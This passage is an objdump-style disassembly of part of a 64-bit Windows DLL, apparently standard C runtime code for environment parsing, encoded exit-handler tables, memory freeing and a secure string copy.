   180005356:	75 14                	jne    0x18000536c
   180005358:	8b 45 40             	mov    0x40(%rbp),%eax
   18000535b:	ff c8                	dec    %eax
   18000535d:	48 89 1d 8c 5c 01 00 	mov    %rbx,0x15c8c(%rip)        # 0x18001aff0
   180005364:	89 05 7e 5c 01 00    	mov    %eax,0x15c7e(%rip)        # 0x18001afe8
   18000536a:	eb c3                	jmp    0x18000532f
   18000536c:	48 8d 55 38          	lea    0x38(%rbp),%rdx
   180005370:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   180005374:	48 8b cb             	mov    %rbx,%rcx
   180005377:	e8 cc 21 00 00       	call   0x180007548
   18000537c:	8b f0                	mov    %eax,%esi
   18000537e:	85 c0                	test   %eax,%eax
   180005380:	74 19                	je     0x18000539b
   180005382:	48 8b 4d 38          	mov    0x38(%rbp),%rcx
   180005386:	e8 e5 16 00 00       	call   0x180006a70
   18000538b:	48 8b cb             	mov    %rbx,%rcx
   18000538e:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   180005392:	e8 d9 16 00 00       	call   0x180006a70
   180005397:	8b fe                	mov    %esi,%edi
   180005399:	eb 3f                	jmp    0x1800053da
   18000539b:	48 8b 55 38          	mov    0x38(%rbp),%rdx
   18000539f:	48 8b cf             	mov    %rdi,%rcx
   1800053a2:	48 8b c2             	mov    %rdx,%rax
   1800053a5:	48 39 3a             	cmp    %rdi,(%rdx)
   1800053a8:	74 0c                	je     0x1800053b6
   1800053aa:	48 8d 40 08          	lea    0x8(%rax),%rax
   1800053ae:	48 ff c1             	inc    %rcx
   1800053b1:	48 39 38             	cmp    %rdi,(%rax)
   1800053b4:	75 f4                	jne    0x1800053aa
   1800053b6:	89 0d 2c 5c 01 00    	mov    %ecx,0x15c2c(%rip)        # 0x18001afe8
   1800053bc:	33 c9                	xor    %ecx,%ecx
   1800053be:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   1800053c2:	48 89 15 27 5c 01 00 	mov    %rdx,0x15c27(%rip)        # 0x18001aff0
   1800053c9:	e8 a2 16 00 00       	call   0x180006a70
   1800053ce:	48 8b cb             	mov    %rbx,%rcx
   1800053d1:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   1800053d5:	e8 96 16 00 00       	call   0x180006a70
   1800053da:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   1800053df:	8b c7                	mov    %edi,%eax
   1800053e1:	48 83 c4 30          	add    $0x30,%rsp
   1800053e5:	41 5f                	pop    %r15
   1800053e7:	41 5e                	pop    %r14
   1800053e9:	5f                   	pop    %rdi
   1800053ea:	5e                   	pop    %rsi
   1800053eb:	5d                   	pop    %rbp
   1800053ec:	c3                   	ret
   1800053ed:	cc                   	int3
   1800053ee:	cc                   	int3
   1800053ef:	cc                   	int3
   1800053f0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800053f5:	57                   	push   %rdi
   1800053f6:	48 83 ec 20          	sub    $0x20,%rsp
   1800053fa:	33 ff                	xor    %edi,%edi
   1800053fc:	48 39 3d f5 58 01 00 	cmp    %rdi,0x158f5(%rip)        # 0x18001acf8
   180005403:	74 04                	je     0x180005409
   180005405:	33 c0                	xor    %eax,%eax
   180005407:	eb 4f                	jmp    0x180005458
   180005409:	e8 8a 2b 00 00       	call   0x180007f98
   18000540e:	e8 e9 30 00 00       	call   0x1800084fc
   180005413:	48 8b d8             	mov    %rax,%rbx
   180005416:	48 85 c0             	test   %rax,%rax
   180005419:	75 0c                	jne    0x180005427
   18000541b:	33 c9                	xor    %ecx,%ecx
   18000541d:	e8 4e 16 00 00       	call   0x180006a70
   180005422:	83 c8 ff             	or     $0xffffffff,%eax
   180005425:	eb 31                	jmp    0x180005458
   180005427:	48 8b cb             	mov    %rbx,%rcx
   18000542a:	e8 35 00 00 00       	call   0x180005464
   18000542f:	48 85 c0             	test   %rax,%rax
   180005432:	75 05                	jne    0x180005439
   180005434:	83 cf ff             	or     $0xffffffff,%edi
   180005437:	eb 0e                	jmp    0x180005447
   180005439:	48 89 05 d0 58 01 00 	mov    %rax,0x158d0(%rip)        # 0x18001ad10
   180005440:	48 89 05 b1 58 01 00 	mov    %rax,0x158b1(%rip)        # 0x18001acf8
   180005447:	33 c9                	xor    %ecx,%ecx
   180005449:	e8 22 16 00 00       	call   0x180006a70
   18000544e:	48 8b cb             	mov    %rbx,%rcx
   180005451:	e8 1a 16 00 00       	call   0x180006a70
   180005456:	8b c7                	mov    %edi,%eax
   180005458:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000545d:	48 83 c4 20          	add    $0x20,%rsp
   180005461:	5f                   	pop    %rdi
   180005462:	c3                   	ret
   180005463:	cc                   	int3
   180005464:	48 8b c4             	mov    %rsp,%rax
   180005467:	48 89 58 08          	mov    %rbx,0x8(%rax)
   18000546b:	48 89 68 10          	mov    %rbp,0x10(%rax)
   18000546f:	48 89 70 18          	mov    %rsi,0x18(%rax)
   180005473:	48 89 78 20          	mov    %rdi,0x20(%rax)
   180005477:	41 56                	push   %r14
   180005479:	48 83 ec 30          	sub    $0x30,%rsp
   18000547d:	48 8b f1             	mov    %rcx,%rsi
   180005480:	33 c9                	xor    %ecx,%ecx
   180005482:	4c 8b c6             	mov    %rsi,%r8
   180005485:	8a 16                	mov    (%rsi),%dl
   180005487:	eb 25                	jmp    0x1800054ae
   180005489:	80 fa 3d             	cmp    $0x3d,%dl
   18000548c:	48 8d 41 01          	lea    0x1(%rcx),%rax
   180005490:	48 0f 44 c1          	cmove  %rcx,%rax
   180005494:	48 8b c8             	mov    %rax,%rcx
   180005497:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   18000549b:	48 ff c0             	inc    %rax
   18000549e:	41 80 3c 00 00       	cmpb   $0x0,(%r8,%rax,1)
   1800054a3:	75 f6                	jne    0x18000549b
   1800054a5:	49 ff c0             	inc    %r8
   1800054a8:	4c 03 c0             	add    %rax,%r8
   1800054ab:	41 8a 10             	mov    (%r8),%dl
   1800054ae:	84 d2                	test   %dl,%dl
   1800054b0:	75 d7                	jne    0x180005489
   1800054b2:	48 ff c1             	inc    %rcx
   1800054b5:	ba 08 00 00 00       	mov    $0x8,%edx
   1800054ba:	e8 31 15 00 00       	call   0x1800069f0
   1800054bf:	48 8b d8             	mov    %rax,%rbx
   1800054c2:	48 85 c0             	test   %rax,%rax
   1800054c5:	75 0b                	jne    0x1800054d2
   1800054c7:	33 c9                	xor    %ecx,%ecx
   1800054c9:	e8 a2 15 00 00       	call   0x180006a70
   1800054ce:	33 c0                	xor    %eax,%eax
   1800054d0:	eb 61                	jmp    0x180005533
   1800054d2:	4c 8b f3             	mov    %rbx,%r14
   1800054d5:	eb 4c                	jmp    0x180005523
   1800054d7:	48 83 cd ff          	or     $0xffffffffffffffff,%rbp
   1800054db:	48 ff c5             	inc    %rbp
   1800054de:	80 3c 2e 00          	cmpb   $0x0,(%rsi,%rbp,1)
   1800054e2:	75 f7                	jne    0x1800054db
   1800054e4:	48 ff c5             	inc    %rbp
   1800054e7:	3c 3d                	cmp    $0x3d,%al
   1800054e9:	74 35                	je     0x180005520
   1800054eb:	ba 01 00 00 00       	mov    $0x1,%edx
   1800054f0:	48 8b cd             	mov    %rbp,%rcx
   1800054f3:	e8 f8 14 00 00       	call   0x1800069f0
   1800054f8:	48 8b f8             	mov    %rax,%rdi
   1800054fb:	48 85 c0             	test   %rax,%rax
   1800054fe:	74 4e                	je     0x18000554e
   180005500:	4c 8b c6             	mov    %rsi,%r8
   180005503:	48 8b d5             	mov    %rbp,%rdx
   180005506:	48 8b c8             	mov    %rax,%rcx
   180005509:	e8 e2 04 00 00       	call   0x1800059f0
   18000550e:	33 c9                	xor    %ecx,%ecx
   180005510:	85 c0                	test   %eax,%eax
   180005512:	75 4e                	jne    0x180005562
   180005514:	49 89 3e             	mov    %rdi,(%r14)
   180005517:	49 83 c6 08          	add    $0x8,%r14
   18000551b:	e8 50 15 00 00       	call   0x180006a70
   180005520:	48 03 f5             	add    %rbp,%rsi
   180005523:	8a 06                	mov    (%rsi),%al
   180005525:	84 c0                	test   %al,%al
   180005527:	75 ae                	jne    0x1800054d7
   180005529:	33 c9                	xor    %ecx,%ecx
   18000552b:	e8 40 15 00 00       	call   0x180006a70
   180005530:	48 8b c3             	mov    %rbx,%rax
   180005533:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180005538:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   18000553d:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   180005542:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   180005547:	48 83 c4 30          	add    $0x30,%rsp
   18000554b:	41 5e                	pop    %r14
   18000554d:	c3                   	ret
   18000554e:	48 8b cb             	mov    %rbx,%rcx
   180005551:	e8 22 00 00 00       	call   0x180005578
   180005556:	33 c9                	xor    %ecx,%ecx
   180005558:	e8 13 15 00 00       	call   0x180006a70
   18000555d:	e9 65 ff ff ff       	jmp    0x1800054c7
   180005562:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   180005568:	45 33 c9             	xor    %r9d,%r9d
   18000556b:	45 33 c0             	xor    %r8d,%r8d
   18000556e:	33 d2                	xor    %edx,%edx
   180005570:	e8 f7 09 00 00       	call   0x180005f6c
   180005575:	cc                   	int3
   180005576:	cc                   	int3
   180005577:	cc                   	int3
   180005578:	48 85 c9             	test   %rcx,%rcx
   18000557b:	74 3b                	je     0x1800055b8
   18000557d:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180005582:	57                   	push   %rdi
   180005583:	48 83 ec 20          	sub    $0x20,%rsp
   180005587:	48 8b 01             	mov    (%rcx),%rax
   18000558a:	48 8b d9             	mov    %rcx,%rbx
   18000558d:	48 8b f9             	mov    %rcx,%rdi
   180005590:	eb 0f                	jmp    0x1800055a1
   180005592:	48 8b c8             	mov    %rax,%rcx
   180005595:	e8 d6 14 00 00       	call   0x180006a70
   18000559a:	48 8d 7f 08          	lea    0x8(%rdi),%rdi
   18000559e:	48 8b 07             	mov    (%rdi),%rax
   1800055a1:	48 85 c0             	test   %rax,%rax
   1800055a4:	75 ec                	jne    0x180005592
   1800055a6:	48 8b cb             	mov    %rbx,%rcx
   1800055a9:	e8 c2 14 00 00       	call   0x180006a70
   1800055ae:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800055b3:	48 83 c4 20          	add    $0x20,%rsp
   1800055b7:	5f                   	pop    %rdi
   1800055b8:	c3                   	ret
   1800055b9:	cc                   	int3
   1800055ba:	cc                   	int3
   1800055bb:	cc                   	int3
   1800055bc:	48 83 ec 28          	sub    $0x28,%rsp
   1800055c0:	48 8b 09             	mov    (%rcx),%rcx
   1800055c3:	48 3b 0d 46 57 01 00 	cmp    0x15746(%rip),%rcx        # 0x18001ad10
   1800055ca:	74 05                	je     0x1800055d1
   1800055cc:	e8 a7 ff ff ff       	call   0x180005578
   1800055d1:	48 83 c4 28          	add    $0x28,%rsp
   1800055d5:	c3                   	ret
   1800055d6:	cc                   	int3
   1800055d7:	cc                   	int3
   1800055d8:	48 83 ec 28          	sub    $0x28,%rsp
   1800055dc:	48 8b 09             	mov    (%rcx),%rcx
   1800055df:	48 3b 0d 22 57 01 00 	cmp    0x15722(%rip),%rcx        # 0x18001ad08
   1800055e6:	74 05                	je     0x1800055ed
   1800055e8:	e8 8b ff ff ff       	call   0x180005578
   1800055ed:	48 83 c4 28          	add    $0x28,%rsp
   1800055f1:	c3                   	ret
   1800055f2:	cc                   	int3
   1800055f3:	cc                   	int3
   1800055f4:	48 83 ec 38          	sub    $0x38,%rsp
   1800055f8:	48 c7 44 24 20 fe ff 	movq   $0xfffffffffffffffe,0x20(%rsp)
   1800055ff:	ff ff 
   180005601:	48 8d 0d f0 56 01 00 	lea    0x156f0(%rip),%rcx        # 0x18001acf8
   180005608:	e8 af ff ff ff       	call   0x1800055bc
   18000560d:	90                   	nop
   18000560e:	48 8d 0d eb 56 01 00 	lea    0x156eb(%rip),%rcx        # 0x18001ad00
   180005615:	e8 be ff ff ff       	call   0x1800055d8
   18000561a:	90                   	nop
   18000561b:	48 8b 0d ee 56 01 00 	mov    0x156ee(%rip),%rcx        # 0x18001ad10
   180005622:	e8 51 ff ff ff       	call   0x180005578
   180005627:	48 8b 0d da 56 01 00 	mov    0x156da(%rip),%rcx        # 0x18001ad08
   18000562e:	48 83 c4 38          	add    $0x38,%rsp
   180005632:	e9 41 ff ff ff       	jmp    0x180005578
   180005637:	cc                   	int3
   180005638:	e9 b3 fd ff ff       	jmp    0x1800053f0
   18000563d:	cc                   	int3
   18000563e:	cc                   	int3
   18000563f:	cc                   	int3
   180005640:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180005645:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   18000564a:	57                   	push   %rdi
   18000564b:	48 83 ec 20          	sub    $0x20,%rsp
   18000564f:	49 8b d9             	mov    %r9,%rbx
   180005652:	49 8b f8             	mov    %r8,%rdi
   180005655:	8b 0a                	mov    (%rdx),%ecx
   180005657:	e8 bc 12 00 00       	call   0x180006918
   18000565c:	90                   	nop
   18000565d:	48 8b cf             	mov    %rdi,%rcx
   180005660:	e8 17 00 00 00       	call   0x18000567c
   180005665:	8b f8                	mov    %eax,%edi
   180005667:	8b 0b                	mov    (%rbx),%ecx
   180005669:	e8 fe 12 00 00       	call   0x18000696c
   18000566e:	8b c7                	mov    %edi,%eax
   180005670:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180005675:	48 83 c4 20          	add    $0x20,%rsp
   180005679:	5f                   	pop    %rdi
   18000567a:	c3                   	ret
   18000567b:	cc                   	int3
   18000567c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180005681:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   180005686:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000568b:	57                   	push   %rdi
   18000568c:	41 56                	push   %r14
   18000568e:	41 57                	push   %r15
   180005690:	48 83 ec 20          	sub    $0x20,%rsp
   180005694:	48 8b 01             	mov    (%rcx),%rax
   180005697:	48 8b f1             	mov    %rcx,%rsi
   18000569a:	48 8b 10             	mov    (%rax),%rdx
   18000569d:	48 85 d2             	test   %rdx,%rdx
   1800056a0:	75 08                	jne    0x1800056aa
   1800056a2:	83 c8 ff             	or     $0xffffffff,%eax
   1800056a5:	e9 ce 00 00 00       	jmp    0x180005778
   1800056aa:	4c 8b 05 4f 49 01 00 	mov    0x1494f(%rip),%r8        # 0x18001a000
   1800056b1:	41 8b c8             	mov    %r8d,%ecx
   1800056b4:	49 8b f8             	mov    %r8,%rdi
   1800056b7:	48 33 3a             	xor    (%rdx),%rdi
   1800056ba:	83 e1 3f             	and    $0x3f,%ecx
   1800056bd:	48 d3 cf             	ror    %cl,%rdi
   1800056c0:	49 8b d8             	mov    %r8,%rbx
   1800056c3:	48 33 5a 08          	xor    0x8(%rdx),%rbx
   1800056c7:	48 d3 cb             	ror    %cl,%rbx
   1800056ca:	48 8d 47 ff          	lea    -0x1(%rdi),%rax
   1800056ce:	48 83 f8 fd          	cmp    $0xfffffffffffffffd,%rax
   1800056d2:	0f 87 9e 00 00 00    	ja     0x180005776
   1800056d8:	41 8b c8             	mov    %r8d,%ecx
   1800056db:	4d 8b f0             	mov    %r8,%r14
   1800056de:	83 e1 3f             	and    $0x3f,%ecx
   1800056e1:	4c 8b ff             	mov    %rdi,%r15
   1800056e4:	48 8b eb             	mov    %rbx,%rbp
   1800056e7:	48 83 eb 08          	sub    $0x8,%rbx
   1800056eb:	48 3b df             	cmp    %rdi,%rbx
   1800056ee:	72 54                	jb     0x180005744
   1800056f0:	48 8b 03             	mov    (%rbx),%rax
   1800056f3:	49 3b c6             	cmp    %r14,%rax
   1800056f6:	74 ef                	je     0x1800056e7
   1800056f8:	49 33 c0             	xor    %r8,%rax
   1800056fb:	4c 89 33             	mov    %r14,(%rbx)
   1800056fe:	48 d3 c8             	ror    %cl,%rax
   180005701:	e8 2a 7b 00 00       	call   0x18000d230
   180005706:	4c 8b 05 f3 48 01 00 	mov    0x148f3(%rip),%r8        # 0x18001a000
   18000570d:	48 8b 06             	mov    (%rsi),%rax
   180005710:	41 8b c8             	mov    %r8d,%ecx
   180005713:	83 e1 3f             	and    $0x3f,%ecx
   180005716:	4d 8b c8             	mov    %r8,%r9
   180005719:	48 8b 10             	mov    (%rax),%rdx
   18000571c:	49 8b c0             	mov    %r8,%rax
   18000571f:	4c 33 0a             	xor    (%rdx),%r9
   180005722:	48 33 42 08          	xor    0x8(%rdx),%rax
   180005726:	49 d3 c9             	ror    %cl,%r9
   180005729:	48 d3 c8             	ror    %cl,%rax
   18000572c:	4d 3b cf             	cmp    %r15,%r9
   18000572f:	75 05                	jne    0x180005736
   180005731:	48 3b c5             	cmp    %rbp,%rax
   180005734:	74 b1                	je     0x1800056e7
   180005736:	4d 8b f9             	mov    %r9,%r15
   180005739:	49 8b f9             	mov    %r9,%rdi
   18000573c:	48 8b e8             	mov    %rax,%rbp
   18000573f:	48 8b d8             	mov    %rax,%rbx
   180005742:	eb a3                	jmp    0x1800056e7
   180005744:	48 83 ff ff          	cmp    $0xffffffffffffffff,%rdi
   180005748:	74 0f                	je     0x180005759
   18000574a:	48 8b cf             	mov    %rdi,%rcx
   18000574d:	e8 1e 13 00 00       	call   0x180006a70
   180005752:	4c 8b 05 a7 48 01 00 	mov    0x148a7(%rip),%r8        # 0x18001a000
   180005759:	48 8b 06             	mov    (%rsi),%rax
   18000575c:	48 8b 08             	mov    (%rax),%rcx
   18000575f:	4c 89 01             	mov    %r8,(%rcx)
   180005762:	48 8b 06             	mov    (%rsi),%rax
   180005765:	48 8b 08             	mov    (%rax),%rcx
   180005768:	4c 89 41 08          	mov    %r8,0x8(%rcx)
   18000576c:	48 8b 06             	mov    (%rsi),%rax
   18000576f:	48 8b 08             	mov    (%rax),%rcx
   180005772:	4c 89 41 10          	mov    %r8,0x10(%rcx)
   180005776:	33 c0                	xor    %eax,%eax
   180005778:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   18000577d:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   180005782:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   180005787:	48 83 c4 20          	add    $0x20,%rsp
   18000578b:	41 5f                	pop    %r15
   18000578d:	41 5e                	pop    %r14
   18000578f:	5f                   	pop    %rdi
   180005790:	c3                   	ret
   180005791:	cc                   	int3
   180005792:	cc                   	int3
   180005793:	cc                   	int3
   180005794:	4c 8b dc             	mov    %rsp,%r11
   180005797:	49 89 4b 08          	mov    %rcx,0x8(%r11)
   18000579b:	48 83 ec 38          	sub    $0x38,%rsp
   18000579f:	49 c7 43 f0 fe ff ff 	movq   $0xfffffffffffffffe,-0x10(%r11)
   1800057a6:	ff 
   1800057a7:	49 8d 43 08          	lea    0x8(%r11),%rax
   1800057ab:	49 89 43 e8          	mov    %rax,-0x18(%r11)
   1800057af:	b8 02 00 00 00       	mov    $0x2,%eax
   1800057b4:	89 44 24 50          	mov    %eax,0x50(%rsp)
   1800057b8:	89 44 24 58          	mov    %eax,0x58(%rsp)
   1800057bc:	4d 8d 4b 18          	lea    0x18(%r11),%r9
   1800057c0:	4d 8d 43 e8          	lea    -0x18(%r11),%r8
   1800057c4:	49 8d 53 20          	lea    0x20(%r11),%rdx
   1800057c8:	49 8d 4b 10          	lea    0x10(%r11),%rcx
   1800057cc:	e8 6f fe ff ff       	call   0x180005640
   1800057d1:	90                   	nop
   1800057d2:	48 83 c4 38          	add    $0x38,%rsp
   1800057d6:	c3                   	ret
   1800057d7:	cc                   	int3
   1800057d8:	48 85 c9             	test   %rcx,%rcx
   1800057db:	75 04                	jne    0x1800057e1
   1800057dd:	83 c8 ff             	or     $0xffffffff,%eax
   1800057e0:	c3                   	ret
   1800057e1:	48 8b 41 10          	mov    0x10(%rcx),%rax
   1800057e5:	48 39 01             	cmp    %rax,(%rcx)
   1800057e8:	75 12                	jne    0x1800057fc
   1800057ea:	48 8b 05 0f 48 01 00 	mov    0x1480f(%rip),%rax        # 0x18001a000
   1800057f1:	48 89 01             	mov    %rax,(%rcx)
   1800057f4:	48 89 41 08          	mov    %rax,0x8(%rcx)
   1800057f8:	48 89 41 10          	mov    %rax,0x10(%rcx)
   1800057fc:	33 c0                	xor    %eax,%eax
   1800057fe:	c3                   	ret
   1800057ff:	cc                   	int3
   180005800:	48 8d 05 99 48 01 00 	lea    0x14899(%rip),%rax        # 0x18001a0a0
   180005807:	48 89 05 4a 55 01 00 	mov    %rax,0x1554a(%rip)        # 0x18001ad58
   18000580e:	b0 01                	mov    $0x1,%al
   180005810:	c3                   	ret
   180005811:	cc                   	int3
   180005812:	cc                   	int3
   180005813:	cc                   	int3
   180005814:	48 83 ec 28          	sub    $0x28,%rsp
   180005818:	48 8d 0d f9 54 01 00 	lea    0x154f9(%rip),%rcx        # 0x18001ad18
   18000581f:	e8 b4 ff ff ff       	call   0x1800057d8
   180005824:	48 8d 0d 05 55 01 00 	lea    0x15505(%rip),%rcx        # 0x18001ad30
   18000582b:	e8 a8 ff ff ff       	call   0x1800057d8
   180005830:	b0 01                	mov    $0x1,%al
   180005832:	48 83 c4 28          	add    $0x28,%rsp
   180005836:	c3                   	ret
   180005837:	cc                   	int3
   180005838:	b0 01                	mov    $0x1,%al
   18000583a:	c3                   	ret
   18000583b:	cc                   	int3
   18000583c:	48 83 ec 28          	sub    $0x28,%rsp
   180005840:	e8 af fd ff ff       	call   0x1800055f4
   180005845:	b0 01                	mov    $0x1,%al
   180005847:	48 83 c4 28          	add    $0x28,%rsp
   18000584b:	c3                   	ret
   18000584c:	40 53                	rex push %rbx
   18000584e:	48 83 ec 20          	sub    $0x20,%rsp
   180005852:	48 8b 1d a7 47 01 00 	mov    0x147a7(%rip),%rbx        # 0x18001a000
   180005859:	48 8b cb             	mov    %rbx,%rcx
   18000585c:	e8 8f 05 00 00       	call   0x180005df0
   180005861:	48 8b cb             	mov    %rbx,%rcx
   180005864:	e8 e7 36 00 00       	call   0x180008f50
   180005869:	48 8b cb             	mov    %rbx,%rcx
   18000586c:	e8 13 38 00 00       	call   0x180009084
   180005871:	48 8b cb             	mov    %rbx,%rcx
   180005874:	e8 87 3a 00 00       	call   0x180009300
   180005879:	48 8b cb             	mov    %rbx,%rcx
   18000587c:	e8 a3 f7 ff ff       	call   0x180005024
   180005881:	b0 01                	mov    $0x1,%al
   180005883:	48 83 c4 20          	add    $0x20,%rsp
   180005887:	5b                   	pop    %rbx
   180005888:	c3                   	ret
   180005889:	cc                   	int3
   18000588a:	cc                   	int3
   18000588b:	cc                   	int3
   18000588c:	33 c9                	xor    %ecx,%ecx
   18000588e:	e9 3d ca ff ff       	jmp    0x1800022d0
   180005893:	cc                   	int3
   180005894:	40 53                	rex push %rbx
   180005896:	48 83 ec 20          	sub    $0x20,%rsp
   18000589a:	48 8b 0d 2f 57 01 00 	mov    0x1572f(%rip),%rcx        # 0x18001afd0
   1800058a1:	83 c8 ff             	or     $0xffffffff,%eax
   1800058a4:	f0 0f c1 01          	lock xadd %eax,(%rcx)
   1800058a8:	83 f8 01             	cmp    $0x1,%eax
   1800058ab:	75 1f                	jne    0x1800058cc
   1800058ad:	48 8b 0d 1c 57 01 00 	mov    0x1571c(%rip),%rcx        # 0x18001afd0
   1800058b4:	48 8d 1d 55 49 01 00 	lea    0x14955(%rip),%rbx        # 0x18001a210
   1800058bb:	48 3b cb             	cmp    %rbx,%rcx
   1800058be:	74 0c                	je     0x1800058cc
   1800058c0:	e8 ab 11 00 00       	call   0x180006a70
   1800058c5:	48 89 1d 04 57 01 00 	mov    %rbx,0x15704(%rip)        # 0x18001afd0
   1800058cc:	b0 01                	mov    $0x1,%al
   1800058ce:	48 83 c4 20          	add    $0x20,%rsp
   1800058d2:	5b                   	pop    %rbx
   1800058d3:	c3                   	ret
   1800058d4:	48 83 ec 28          	sub    $0x28,%rsp
   1800058d8:	48 8b 0d 39 5c 01 00 	mov    0x15c39(%rip),%rcx        # 0x18001b518
   1800058df:	e8 8c 11 00 00       	call   0x180006a70
   1800058e4:	48 8b 0d 35 5c 01 00 	mov    0x15c35(%rip),%rcx        # 0x18001b520
   1800058eb:	48 83 25 25 5c 01 00 	andq   $0x0,0x15c25(%rip)        # 0x18001b518
   1800058f2:	00 
   1800058f3:	e8 78 11 00 00       	call   0x180006a70
   1800058f8:	48 8b 0d f1 56 01 00 	mov    0x156f1(%rip),%rcx        # 0x18001aff0
   1800058ff:	48 83 25 19 5c 01 00 	andq   $0x0,0x15c19(%rip)        # 0x18001b520
   180005906:	00 
   180005907:	e8 64 11 00 00       	call   0x180006a70
   18000590c:	48 8b 0d e5 56 01 00 	mov    0x156e5(%rip),%rcx        # 0x18001aff8
   180005913:	48 83 25 d5 56 01 00 	andq   $0x0,0x156d5(%rip)        # 0x18001aff0
   18000591a:	00 
   18000591b:	e8 50 11 00 00       	call   0x180006a70
   180005920:	48 83 25 d0 56 01 00 	andq   $0x0,0x156d0(%rip)        # 0x18001aff8
   180005927:	00 
   180005928:	b0 01                	mov    $0x1,%al
   18000592a:	48 83 c4 28          	add    $0x28,%rsp
   18000592e:	c3                   	ret
   18000592f:	cc                   	int3
   180005930:	48 8d 15 79 ab 00 00 	lea    0xab79(%rip),%rdx        # 0x1800104b0
   180005937:	48 8d 0d 72 aa 00 00 	lea    0xaa72(%rip),%rcx        # 0x1800103b0
   18000593e:	e9 09 35 00 00       	jmp    0x180008e4c
   180005943:	cc                   	int3
   180005944:	48 83 ec 28          	sub    $0x28,%rsp
   180005948:	e8 ab 0c 00 00       	call   0x1800065f8
   18000594d:	48 85 c0             	test   %rax,%rax
   180005950:	0f 95 c0             	setne  %al
   180005953:	48 83 c4 28          	add    $0x28,%rsp
   180005957:	c3                   	ret
   180005958:	48 83 ec 28          	sub    $0x28,%rsp
   18000595c:	e8 e7 0b 00 00       	call   0x180006548
   180005961:	b0 01                	mov    $0x1,%al
   180005963:	48 83 c4 28          	add    $0x28,%rsp
   180005967:	c3                   	ret
   180005968:	48 83 ec 28          	sub    $0x28,%rsp
   18000596c:	84 c9                	test   %cl,%cl
   18000596e:	74 16                	je     0x180005986
   180005970:	48 83 3d 98 5b 01 00 	cmpq   $0x0,0x15b98(%rip)        # 0x18001b510
   180005977:	00 
   180005978:	74 05                	je     0x18000597f
   18000597a:	e8 c9 3c 00 00       	call   0x180009648
   18000597f:	b0 01                	mov    $0x1,%al
   180005981:	48 83 c4 28          	add    $0x28,%rsp
   180005985:	c3                   	ret
   180005986:	48 8d 15 23 ab 00 00 	lea    0xab23(%rip),%rdx        # 0x1800104b0
   18000598d:	48 8d 0d 1c aa 00 00 	lea    0xaa1c(%rip),%rcx        # 0x1800103b0
   180005994:	48 83 c4 28          	add    $0x28,%rsp
   180005998:	e9 2f 35 00 00       	jmp    0x180008ecc
   18000599d:	cc                   	int3
   18000599e:	cc                   	int3
   18000599f:	cc                   	int3
   1800059a0:	48 83 ec 28          	sub    $0x28,%rsp
   1800059a4:	e8 7f 0d 00 00       	call   0x180006728
   1800059a9:	b0 01                	mov    $0x1,%al
   1800059ab:	48 83 c4 28          	add    $0x28,%rsp
   1800059af:	c3                   	ret
   1800059b0:	48 83 ec 28          	sub    $0x28,%rsp
   1800059b4:	e8 df 0b 00 00       	call   0x180006598
   1800059b9:	48 8b 40 18          	mov    0x18(%rax),%rax
   1800059bd:	48 85 c0             	test   %rax,%rax
   1800059c0:	74 07                	je     0x1800059c9
   1800059c2:	e8 69 78 00 00       	call   0x18000d230
   1800059c7:	eb 00                	jmp    0x1800059c9
   1800059c9:	e8 a2 00 00 00       	call   0x180005a70
   1800059ce:	90                   	nop
   1800059cf:	cc                   	int3
   1800059d0:	e9 9b 10 00 00       	jmp    0x180006a70
   1800059d5:	cc                   	int3
   1800059d6:	cc                   	int3
   1800059d7:	cc                   	int3
   1800059d8:	cc                   	int3
   1800059d9:	cc                   	int3
   1800059da:	cc                   	int3
   1800059db:	cc                   	int3
   1800059dc:	cc                   	int3
   1800059dd:	cc                   	int3
   1800059de:	cc                   	int3
   1800059df:	cc                   	int3
   1800059e0:	e9 0b 3e 00 00       	jmp    0x1800097f0
   1800059e5:	cc                   	int3
   1800059e6:	cc                   	int3
   1800059e7:	cc                   	int3
   1800059e8:	cc                   	int3
   1800059e9:	cc                   	int3
   1800059ea:	cc                   	int3
   1800059eb:	cc                   	int3
   1800059ec:	cc                   	int3
   1800059ed:	cc                   	int3
   1800059ee:	cc                   	int3
   1800059ef:	cc                   	int3
   1800059f0:	48 83 ec 28          	sub    $0x28,%rsp
   1800059f4:	4c 8b c9             	mov    %rcx,%r9
   1800059f7:	48 85 c9             	test   %rcx,%rcx
   1800059fa:	74 0d                	je     0x180005a09
   1800059fc:	48 85 d2             	test   %rdx,%rdx
   1800059ff:	74 08                	je     0x180005a09
   180005a01:	4d 85 c0             	test   %r8,%r8
   180005a04:	75 1d                	jne    0x180005a23
   180005a06:	44 88 01             	mov    %r8b,(%rcx)
   180005a09:	e8 e6 06 00 00       	call   0x1800060f4
   180005a0e:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   180005a14:	e8 33 05 00 00       	call   0x180005f4c
   180005a19:	b8 16 00 00 00       	mov    $0x16,%eax
   180005a1e:	48 83 c4 28          	add    $0x28,%rsp
   180005a22:	c3                   	ret
   180005a23:	4d 2b c1             	sub    %r9,%r8
   180005a26:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   180005a2d:	00 00 00 
   180005a30:	41 0f b6 04 08       	movzbl (%r8,%rcx,1),%eax
   180005a35:	88 01                	mov    %al,(%rcx)
